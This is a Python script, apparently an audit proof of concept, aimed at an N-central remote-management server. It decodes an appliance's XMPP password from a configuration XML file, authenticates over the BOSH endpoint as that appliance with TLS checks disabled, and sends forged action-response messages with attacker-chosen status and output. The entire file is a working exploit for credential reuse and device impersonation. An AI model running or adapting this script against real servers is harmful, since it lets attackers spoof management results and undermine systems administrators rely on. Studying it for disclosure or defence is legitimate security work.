#!/usr/bin/env python3
import argparse
import base64
import html
import os
import secrets
import time
import xml.etree.ElementTree as ET

import requests
import urllib3


HTTP_BIND = "http://jabber.org/protocol/httpbind"
JIVE_PROPERTIES = "http://www.jivesoftware.com/xmlns/xmpp/properties"


def local(tag):
    return tag.rsplit("}", 1)[-1]


def appliance_password(path):
    root = ET.parse(path).getroot()
    for node in root.iter():
        children = list(node)
        key = next(((child.text or "").strip() for child in children if local(child.tag) in {"Key1", "Key2"}), "")
        if key.lower() != "password":
            continue
        encoded = next(((child.text or "").strip() for child in children if local(child.tag) == "Values"), "")
        if encoded:
            return base64.b64decode(encoded).decode()
    raise RuntimeError("XMPP password not found")


class Bosh:
    def __init__(self, origin, proxy, appliance_id, password):
        self.url = origin.rstrip("/") + "/http-bind/"
        self.appliance_id = str(appliance_id)
        self.password = password
        self.resource = "audit-proof-" + secrets.token_hex(4)
        self.rid = secrets.randbelow(5000000) + 200000000
        self.sid = ""
        self.http = requests.Session()
        self.http.verify = False
        self.http.trust_env = False
        if proxy:
            self.http.proxies.update({"http": proxy, "https": proxy})

    def raw(self, body, timeout=20):
        return self.http.post(self.url, data=body, headers={"Content-Type": "text/xml; charset=utf-8"}, timeout=timeout)

    def post(self, payload, timeout=20):
        response = self.raw(f'<body rid="{self.rid}" sid="{self.sid}" xmlns="{HTTP_BIND}">{payload}</body>', timeout)
        self.rid += 1
        return response

    def connect(self):
        response = self.raw(
            f'<body content="text/xml; charset=utf-8" hold="1" rid="{self.rid}" to="localhost" '
            f'secure="false" wait="60" xml:lang="en" xmlns="{HTTP_BIND}" ver="1.6" '
            'xmpp:version="1.0" xmlns:xmpp="urn:xmpp:xbosh"/>'
        )
        self.rid += 1
        self.sid = ET.fromstring(response.content).attrib["sid"]
        plain = base64.b64encode(("\x00" + self.appliance_id + "\x00" + self.password).encode()).decode()
        response = self.post(f'<auth mechanism="PLAIN" xmlns="urn:ietf:params:xml:ns:xmpp-sasl">{plain}</auth>')
        if "<success" not in response.text:
            raise RuntimeError("BOSH authentication failed")
        self.raw(
            f'<body rid="{self.rid}" sid="{self.sid}" to="localhost" xmpp:restart="true" '
            f'xmlns:xmpp="urn:xmpp:xbosh" xmlns="{HTTP_BIND}"/>'
        )
        self.rid += 1
        response = self.post(
            '<iq id="bind1" type="set"><bind xmlns="urn:ietf:params:xml:ns:xmpp-bind">'
            f'<resource>{self.resource}</resource></bind></iq>'
        )
        if 'type="result"' not in response.text:
            raise RuntimeError("BOSH resource bind failed")
        self.post("<presence><status>connected</status></presence>")

    def forge_response(self, action_id, status, output):
        encoded = base64.b64encode(output.encode()).decode()
        properties = {
            "messageUUID": action_id,
            "status": status,
            "version": "1.0.0.0",
        }
        prop_xml = "".join(
            "<property><name>" + html.escape(name) + "</name><value type=\"string\">" + html.escape(value) + "</value></property>"
            for name, value in properties.items()
        )
        message = (
            f'<message from="{self.appliance_id}@localhost/{self.resource}" to="ncentral@localhost/Smack" type="normal">'
            '<subject>ApplianceActionSend:delayed</subject>'
            f'<body>{encoded}</body><properties xmlns="{JIVE_PROPERTIES}">{prop_xml}</properties></message>'
        )
        return self.post(message)

    def close(self):
        if not self.sid:
            return
        try:
            self.post('<presence type="unavailable"/>', 10)
            time.sleep(0.5)
            self.raw(f'<body rid="{self.rid}" sid="{self.sid}" type="terminate" xmlns="{HTTP_BIND}"/>')
        except requests.RequestException:
            pass


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--origin", default="https://n-central.local")
    parser.add_argument("--proxy", default=os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY"))
    parser.add_argument("--appliance-id", type=int, required=True)
    parser.add_argument("--config-xml", required=True)
    parser.add_argument("--action-id", required=True)
    parser.add_argument("--wrong-action-id", required=True)
    parser.add_argument("--status", default="Completed")
    parser.add_argument("--output", default="forged-appliance-response")
    args = parser.parse_args()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    bosh = Bosh(args.origin, args.proxy, args.appliance_id, appliance_password(args.config_xml))
    try:
        bosh.connect()
        wrong = bosh.forge_response(args.wrong_action_id, args.status, "wrong-control")
        time.sleep(0.5)
        selected = bosh.forge_response(args.action_id, args.status, args.output)
        time.sleep(1.0)
        print(f"bosh_authenticated=true appliance_id={args.appliance_id}")
        print(f"wrong_response_http={wrong.status_code}")
        print(f"selected_response_http={selected.status_code}")
    finally:
        bosh.close()


if __name__ == "__main__":
    main()
